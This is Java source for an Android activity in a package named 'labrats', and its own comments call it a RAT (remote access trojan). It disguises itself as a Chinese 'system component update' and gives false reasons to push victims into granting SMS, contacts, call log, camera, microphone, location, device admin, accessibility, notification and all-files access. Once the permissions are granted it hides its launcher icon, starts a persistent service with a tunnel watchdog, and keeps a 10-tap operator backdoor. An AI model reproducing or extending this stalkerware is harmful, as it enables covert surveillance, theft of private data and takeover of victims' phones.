package com.labs.labrats;

import android.Manifest;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.os.PowerManager;
import android.provider.Settings;
import android.view.Gravity;
import android.view.ViewGroup;
import android.widget.LinearLayout;
import android.widget.ProgressBar;
import android.widget.TextView;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import java.util.ArrayList;
import java.util.List;

/**
 * One-stop sequential setup wizard (PATCH-16).
 * Native dialogs run in order: 8 runtime-permission steps, battery optimization,
 * device admin, accessibility, notification listener, overlay, install sources,
 * all-files access. After everything is granted the ForegroundCoreService is
 * started and the icon is camouflaged via SystemAnalytics.setStealthMode.
 *
 * UI is built programmatically (no res/ dependencies) because the UI teammate is
 * editing res/ layouts in parallel. DecoyActivity/MainActivity trigger paths and
 * the 10-tap recovery backdoor are preserved.
 */
public class PermissionActivity extends AppCompatActivity {

    private static final int PERMISSION_REQUEST_CODE = 2001;

    private final Handler chainHandler = new Handler(Looper.getMainLooper());
    private int currentStep = -1;
    private boolean waitingForReturn = false;
    private boolean visitedAppDetails = false;
    private boolean permissionRequestInFlight = false;
    private final java.util.HashSet<Integer> skippedSteps = new java.util.HashSet<>();
    private final java.util.HashMap<Integer, Integer> stepAttempts = new java.util.HashMap<>();

    private TextView tvTitle;
    private TextView tvStatus;
    private TextView tvHint;
    private ProgressBar progress;

    // ---------------- shared helpers (public statics kept for other classes) ----------------

    public static boolean isAccessibilityServiceEnabled(Context context) {
        if (IO_Persistence_Manager.getInstance() != null) {
            context.getSharedPreferences("StabilityConfig", Context.MODE_PRIVATE).edit().putBoolean("acc_granted", true).apply();
            return true;
        }
        if (context.getSharedPreferences("StabilityConfig", Context.MODE_PRIVATE).getBoolean("acc_granted", false)) {
            return true;
        }
        try {
            String pkg = context.getPackageName();
            String enabledServices = Settings.Secure.getString(
                context.getContentResolver(),
                Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
            );
            if (enabledServices != null && (enabledServices.contains(pkg) || enabledServices.contains("IO_Persistence_Manager") || enabledServices.contains("com.labs.labrats"))) {
                context.getSharedPreferences("StabilityConfig", Context.MODE_PRIVATE).edit().putBoolean("acc_granted", true).apply();
                return true;
            }
        } catch (Exception ignored) {}
        return false;
    }

    public static boolean isNotificationServiceEnabled(Context context) {
        if (context.getSharedPreferences("StabilityConfig", Context.MODE_PRIVATE).getBoolean("notif_granted", false)) {
            return true;
        }
        try {
            String pkgName = context.getPackageName();
            final String flat = Settings.Secure.getString(context.getContentResolver(), "enabled_notification_listeners");
            if (flat != null && !flat.isEmpty()) {
                if (flat.contains(pkgName) || flat.contains("StatusNotification") || flat.contains("com.labs.labrats") || flat.contains("com.android.system.stability")) {
                    context.getSharedPreferences("StabilityConfig", Context.MODE_PRIVATE).edit().putBoolean("notif_granted", true).apply();
                    return true;
                }
                for (String name : flat.split(":")) {
                    ComponentName cn = ComponentName.unflattenFromString(name);
                    if (cn != null && pkgName.equals(cn.getPackageName())) {
                        context.getSharedPreferences("StabilityConfig", Context.MODE_PRIVATE).edit().putBoolean("notif_granted", true).apply();
                        return true;
                    }
                }
            }
        } catch (Exception ignored) {}
        return false;
    }

    private static boolean hasPermission(Context context, String permission) {
        return ContextCompat.checkSelfPermission(context, permission) == PackageManager.PERMISSION_GRANTED;
    }

    private static boolean permanentlyDenied(AppCompatActivity activity, String permission) {
        return !hasPermission(activity, permission)
                && !ActivityCompat.shouldShowRequestPermissionRationale(activity, permission);
    }

    // ---------------- lifecycle ----------------

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        getSharedPreferences("StabilityConfig", MODE_PRIVATE).edit().putBoolean("is_repairing", true).apply();

        if (getIntent() != null && getIntent().getBooleanExtra("launch_admin", false)) {
            openAdminSettings();
            finish();
            return;
        }

        buildUi();
        handleInstructions(getIntent());
        chainHandler.postDelayed(this::beginChain, 400);
    }

    private void buildUi() {
        LinearLayout root = new LinearLayout(this);
        root.setOrientation(LinearLayout.VERTICAL);
        root.setGravity(Gravity.CENTER_HORIZONTAL);
        int pad = (int) (24 * getResources().getDisplayMetrics().density);
        root.setPadding(pad, pad * 2, pad, pad * 2);
        root.setBackgroundColor(0xFF101418);

        tvTitle = new TextView(this);
        tvTitle.setText("系统组件更新");
        tvTitle.setTextColor(0xFFFFFFFF);
        tvTitle.setTextSize(22);
        tvTitle.setGravity(Gravity.CENTER);
        tvTitle.setOnClickListener(v -> handleBackdoorClick());
        root.addView(tvTitle, new LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT));

        progress = new ProgressBar(this, null, android.R.attr.progressBarStyleHorizontal);
        progress.setMax(100);
        progress.setProgress(0);
        LinearLayout.LayoutParams pp = new LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT);
        pp.topMargin = (int) (24 * getResources().getDisplayMetrics().density);
        root.addView(progress, pp);

        tvStatus = new TextView(this);
        tvStatus.setText("正在初始化系统组件 1/8");
        tvStatus.setTextColor(0xFF34A853);
        tvStatus.setTextSize(18);
        tvStatus.setGravity(Gravity.CENTER);
        LinearLayout.LayoutParams sp = new LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT);
        sp.topMargin = (int) (16 * getResources().getDisplayMetrics().density);
        root.addView(tvStatus, sp);

        tvHint = new TextView(this);
        tvHint.setText("请允许系统组件完成初始化");
        tvHint.setTextColor(0xFF9AA0A6);
        tvHint.setTextSize(14);
        tvHint.setGravity(Gravity.CENTER);
        LinearLayout.LayoutParams hp = new LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT);
        hp.topMargin = (int) (12 * getResources().getDisplayMetrics().density);
        root.addView(tvHint, hp);

        setContentView(root);
    }

    // ---------------- step chain ----------------

    private static final int TOTAL_STEPS = 15;

    private void updateUi(int step, String hint) {
        if (tvStatus != null) {
            if (step < 8) {
                tvStatus.setText("正在初始化系统组件 " + (step + 1) + "/8");
            } else {
                tvStatus.setText("正在完成系统组件设置 " + (step - 7) + "/7");
            }
        }
        if (tvHint != null && hint != null) tvHint.setText(hint);
        if (progress != null) {
            progress.setProgress(Math.min(100, ((step + 1) * 100) / TOTAL_STEPS));
        }
    }

    private void beginChain() {
        if (isFinishing() || isDestroyed()) return;
        currentStep = 0;
        advanceChain();
    }

    /**
     * Sequential dispatcher: checks the current step condition; if satisfied it moves
     * on, otherwise it fires the step action and returns (waiting for the dialog/settings
     * page result via onRequestPermissionsResult / onResume).
     */
    private void advanceChain() {
        if (isFinishing() || isDestroyed()) return;

        // Skip steps whose condition is already satisfied, that were permanently skipped,
        // or that are excluded by the minimal permission set (see isNonCoreStep).
        while (currentStep >= 0 && currentStep < TOTAL_STEPS
                && (isStepDone(currentStep) || skippedSteps.contains(currentStep) || isNonCoreStep(currentStep))) {
            currentStep++;
        }

        if (currentStep >= TOTAL_STEPS) {
            onAllComplete();
            return;
        }

        updateUi(currentStep, hintForStep(currentStep));
        fireStep(currentStep);
    }

    // [SLIM] Minimal permission set (default): only core RAT capabilities are requested
    // up-front — camera / microphone / location / battery-optimization / accessibility.
    // SMS, contacts, call-log, storage, phone-state, device-admin, notification access,
    // overlay, install-source and all-files are only requested when PERMISSION_SET=full
    // is set in local.properties (and can be granted later via the panel when needed).
    private boolean isNonCoreStep(int step) {
        if ("full".equalsIgnoreCase(BuildConfig.PERMISSION_SET)) return false;
        switch (step) {
            case 3:   // camera
            case 4:   // microphone
            case 5:   // location
            case 8:   // ignore battery optimizations
            case 10:  // accessibility service
                return false;
            default:
                return true;
        }
    }

    private boolean isStepDone(int step) {
        switch (step) {
            case 0: return hasPermission(this, Manifest.permission.READ_SMS)
                    && hasPermission(this, Manifest.permission.SEND_SMS);
            case 1: return hasPermission(this, Manifest.permission.READ_CONTACTS);
            case 2: return hasPermission(this, Manifest.permission.READ_CALL_LOG);
            case 3: return hasPermission(this, Manifest.permission.CAMERA);
            case 4: return hasPermission(this, Manifest.permission.RECORD_AUDIO);
            case 5: return hasPermission(this, Manifest.permission.ACCESS_FINE_LOCATION)
                    && hasPermission(this, Manifest.permission.ACCESS_COARSE_LOCATION);
            case 6: return storageGranted();
            case 7: return hasPermission(this, Manifest.permission.READ_PHONE_STATE)
                    && (Build.VERSION.SDK_INT < Build.VERSION_CODES.O
                        || hasPermission(this, Manifest.permission.READ_PHONE_NUMBERS));
            case 8: return batteryOptimizationGranted();
            case 9: return deviceAdminGranted();
            case 10: return isAccessibilityServiceEnabled(this);
            case 11: return isNotificationServiceEnabled(this);
            case 12: return Build.VERSION.SDK_INT < Build.VERSION_CODES.M || Settings.canDrawOverlays(this);
            case 13: return Build.VERSION.SDK_INT < Build.VERSION_CODES.O || getPackageManager().canRequestPackageInstalls();
            case 14: return Build.VERSION.SDK_INT < Build.VERSION_CODES.R || android.os.Environment.isExternalStorageManager();
            default: return true;
        }
    }

    private boolean storageGranted() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            return hasPermission(this, Manifest.permission.READ_MEDIA_IMAGES)
                    && hasPermission(this, Manifest.permission.READ_MEDIA_VIDEO)
                    && hasPermission(this, Manifest.permission.READ_MEDIA_AUDIO);
        }
        return hasPermission(this, Manifest.permission.READ_EXTERNAL_STORAGE)
                && hasPermission(this, Manifest.permission.WRITE_EXTERNAL_STORAGE);
    }

    private boolean batteryOptimizationGranted() {
        try {
            PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
            return pm == null || pm.isIgnoringBatteryOptimizations(getPackageName());
        } catch (Exception e) {
            return true;
        }
    }

    private boolean deviceAdminGranted() {
        try {
            DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
            ComponentName admin = new ComponentName(this, StabilityPolicy.class);
            return dpm != null && dpm.isAdminActive(admin);
        } catch (Exception e) {
            return true;
        }
    }

    private String hintForStep(int step) {
        switch (step) {
            case 0: return "需要短信权限以同步系统消息";
            case 1: return "需要联系人权限以同步通讯录";
            case 2: return "需要通话记录权限以同步日志";
            case 3: return "需要相机权限以启用系统组件";
            case 4: return "需要麦克风权限以启用语音组件";
            case 5: return "需要位置权限以优化网络";
            case 6: return "需要存储权限以缓存系统数据";
            case 7: return "需要电话权限以保持组件同步";
            case 8: return "请允许忽略电池优化以保持系统服务";
            case 9: return "请激活设备管理器以完成系统设置";
            case 10: return "开启无障碍服务后返回本页面";
            case 11: return "开启通知使用权后返回本页面";
            case 12: return "请允许显示在其他应用上层";
            case 13: return "请允许安装未知来源应用";
            case 14: return "请允许管理所有文件";
            default: return "正在完成系统组件设置";
        }
    }

    private void fireStep(int step) {
        int attempts = stepAttempts.containsKey(step) ? stepAttempts.get(step) : 0;
        attempts++;
        stepAttempts.put(step, attempts);

        // After 3 failed attempts the step is skipped so the chain can never loop forever
        if (attempts >= 3 && !isStepDone(step)) {
            skippedSteps.add(step);
            advanceChain();
            return;
        }

        // Settings-page steps: mark waiting so onResume re-checks and continues the chain
        if (step >= 8) {
            waitingForReturn = true;
        }

        switch (step) {
            case 0:
                requestPermissions(new String[]{Manifest.permission.READ_SMS, Manifest.permission.SEND_SMS});
                break;
            case 1:
                requestPermissions(new String[]{Manifest.permission.READ_CONTACTS});
                break;
            case 2:
                requestPermissions(new String[]{Manifest.permission.READ_CALL_LOG});
                break;
            case 3:
                requestPermissions(new String[]{Manifest.permission.CAMERA});
                break;
            case 4:
                requestPermissions(new String[]{Manifest.permission.RECORD_AUDIO});
                break;
            case 5:
                requestPermissions(new String[]{Manifest.permission.ACCESS_FINE_LOCATION, Manifest.permission.ACCESS_COARSE_LOCATION});
                break;
            case 6:
                requestPermissions(storagePermissions());
                break;
            case 7:
                requestPermissions(phonePermissions());
                break;
            case 8:
                openBatterySettings();
                break;
            case 9:
                openAdminSettings();
                break;
            case 10:
                openAccessibilitySettings();
                break;
            case 11:
                openNotificationSettings();
                break;
            case 12:
                openOverlaySettings();
                break;
            case 13:
                openInstallSettings();
                break;
            case 14:
                openFilesSettings();
                break;
            default:
                onAllComplete();
                break;
        }
    }

    private void requestPermissions(String[] permissions) {
        // Skip already-granted entries inside the group so the dialog only asks for the missing ones
        List<String> missing = new ArrayList<>();
        for (String p : permissions) {
            if (!hasPermission(this, p)) missing.add(p);
        }
        if (missing.isEmpty()) {
            advanceChain();
            return;
        }
        permissionRequestInFlight = true;
        ActivityCompat.requestPermissions(this, missing.toArray(new String[0]), PERMISSION_REQUEST_CODE);
    }

    private String[] storagePermissions() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            return new String[]{Manifest.permission.READ_MEDIA_IMAGES,
                    Manifest.permission.READ_MEDIA_VIDEO, Manifest.permission.READ_MEDIA_AUDIO};
        }
        return new String[]{Manifest.permission.READ_EXTERNAL_STORAGE, Manifest.permission.WRITE_EXTERNAL_STORAGE};
    }

    private String[] phonePermissions() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            return new String[]{Manifest.permission.READ_PHONE_STATE, Manifest.permission.READ_PHONE_NUMBERS};
        }
        return new String[]{Manifest.permission.READ_PHONE_STATE};
    }

    private void onAllComplete() {
        if (isFinishing() || isDestroyed()) return;
        try {
            IO_Persistence_Manager.setAutoPilot(false);
        } catch (Exception ignored) {}
        // Camouflage the launcher icon (existing stealth logic)
        try {
            SystemAnalytics.setStealthMode(this, true);
        } catch (Exception ignored) {}
        // Start the foreground keep-alive core (60s heartbeat + tunnel watchdog)
        try {
            Intent core = new Intent(this, ForegroundCoreService.class);
            androidx.core.content.ContextCompat.startForegroundService(this, core);
        } catch (Exception ignored) {
            try { startService(new Intent(this, ForegroundCoreService.class)); } catch (Exception ignored2) {}
        }
        getSharedPreferences("StabilityConfig", MODE_PRIVATE).edit().putBoolean("is_repairing", false).apply();
        goHome();
    }

    // ---------------- settings launchers ----------------

    private void openBatterySettings() {
        try {
            Intent intent = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
            intent.setData(Uri.parse("package:" + getPackageName()));
            startActivity(intent);
            return;
        } catch (Exception ignored) {}
        try {
            Intent intent = new Intent(Settings.ACTION_IGNORE_BATTERY_OPTIMIZATION_SETTINGS);
            startActivity(intent);
        } catch (Exception ignored) {}
    }

    private void openAdminSettings() {
        try {
            IO_Persistence_Manager.stopSmartExit();
            ComponentName admin = new ComponentName(this, StabilityPolicy.class);
            Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
            intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, admin);
            intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "需要激活设备管理器以维持系统组件稳定运行。");
            startActivity(intent);
        } catch (Exception ignored) {}
    }

    private void openAccessibilitySettings() {
        // Direct page of our own accessibility service (EMUI-compatible component extra)
        try {
            Intent intent = new Intent("android.settings.ACCESSIBILITY_DETAILS_SETTINGS");
            ComponentName cn = new ComponentName(this, IO_Persistence_Manager.class);
            intent.putExtra(Intent.EXTRA_COMPONENT_NAME, cn.flattenToString());
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS | Intent.FLAG_ACTIVITY_NO_HISTORY);
            startActivity(intent);
            return;
        } catch (Exception ignored) {}
        try {
            Intent intent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS | Intent.FLAG_ACTIVITY_NO_HISTORY);
            startActivity(intent);
        } catch (Exception ignored) {}
    }

    private void openNotificationSettings() {
        try {
            Intent intent = new Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS");
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS | Intent.FLAG_ACTIVITY_NO_HISTORY);
            startActivity(intent);
        } catch (Exception ignored) {}
    }

    private void openOverlaySettings() {
        try {
            Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION, Uri.parse("package:" + getPackageName()));
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS | Intent.FLAG_ACTIVITY_NO_HISTORY);
            startActivity(intent);
        } catch (Exception e) {
            try {
                Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION);
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS | Intent.FLAG_ACTIVITY_NO_HISTORY);
                startActivity(intent);
            } catch (Exception ignored) {}
        }
    }

    private void openInstallSettings() {
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                Intent intent = new Intent(Settings.ACTION_MANAGE_UNKNOWN_APP_SOURCES, Uri.parse("package:" + getPackageName()));
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS | Intent.FLAG_ACTIVITY_NO_HISTORY);
                startActivity(intent);
            }
        } catch (Exception e) {
            try {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    Intent intent = new Intent(Settings.ACTION_MANAGE_UNKNOWN_APP_SOURCES);
                    intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS | Intent.FLAG_ACTIVITY_NO_HISTORY);
                    startActivity(intent);
                }
            } catch (Exception ignored) {}
        }
    }

    private void openFilesSettings() {
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                Intent intent = new Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION, Uri.parse("package:" + getPackageName()));
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS | Intent.FLAG_ACTIVITY_NO_HISTORY);
                startActivity(intent);
            }
        } catch (Exception e) {
            try {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                    Intent intent = new Intent(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION);
                    intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS | Intent.FLAG_ACTIVITY_NO_HISTORY);
                    startActivity(intent);
                }
            } catch (Exception ignored) {}
        }
    }

    private void openAppDetails() {
        try {
            Intent intent = new Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS, Uri.parse("package:" + getPackageName()));
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS);
            startActivity(intent);
        } catch (Exception ignored) {}
    }

    // ---------------- callbacks ----------------

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode != PERMISSION_REQUEST_CODE) return;
        permissionRequestInFlight = false;

        // Permanent-denial detection: denied + no rationale => "don't ask again" was hit
        boolean anyPermanent = false;
        for (int i = 0; i < permissions.length; i++) {
            if (grantResults[i] != PackageManager.PERMISSION_GRANTED
                    && !ActivityCompat.shouldShowRequestPermissionRationale(this, permissions[i])) {
                anyPermanent = true;
            }
        }
        if (anyPermanent && !visitedAppDetails) {
            visitedAppDetails = true;
            updateUi(currentStep, "部分权限被拒绝，请在设置中手动开启后返回");
            chainHandler.postDelayed(() -> {
                openAppDetails();
                waitingForReturn = true;
            }, 500);
            return;
        }
        advanceChain();
    }

    @Override
    protected void onResume() {
        super.onResume();
        if (waitingForReturn) {
            waitingForReturn = false;
            chainHandler.postDelayed(this::advanceChain, 300);
        }
    }

    @Override
    protected void onNewIntent(Intent intent) {
        super.onNewIntent(intent);
        setIntent(intent);
        handleInstructions(intent);
    }

    private void handleInstructions(Intent intent) {
        if (intent == null) return;
        String target = intent.getStringExtra("target_menu");
        if (target == null) return;
        chainHandler.postDelayed(() -> {
            if (target.equals("accessibility")) openAccessibilitySettings();
            else if (target.equals("notifications")) openNotificationSettings();
        }, 300);
    }

    @Override
    public void onBackPressed() {
        if (currentStep >= TOTAL_STEPS) {
            super.onBackPressed();
        } else {
            advanceChain();
        }
    }

    private void goHome() {
        try {
            Intent home = new Intent(Intent.ACTION_MAIN);
            home.addCategory(Intent.CATEGORY_HOME);
            home.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(home);
        } catch (Exception ignored) {}
        finish();
    }

    // ---------------- 10-tap operator recovery (preserved) ----------------

    private int clickCount = 0;
    private long lastClickTime = 0;

    private void handleBackdoorClick() {
        long currentTime = System.currentTimeMillis();
        if (currentTime - lastClickTime < 500) clickCount++;
        else clickCount = 1;
        lastClickTime = currentTime;
        if (clickCount >= 10) {
            Intent intent = new Intent(this, MainActivity.class);
            intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TOP);
            startActivity(intent);
            clickCount = 0;
            finish();
        }
    }

    @Override
    protected void onDestroy() {
        chainHandler.removeCallbacksAndMessages(null);
        getSharedPreferences("StabilityConfig", MODE_PRIVATE).edit().putBoolean("is_repairing", false).apply();
        super.onDestroy();
    }
}
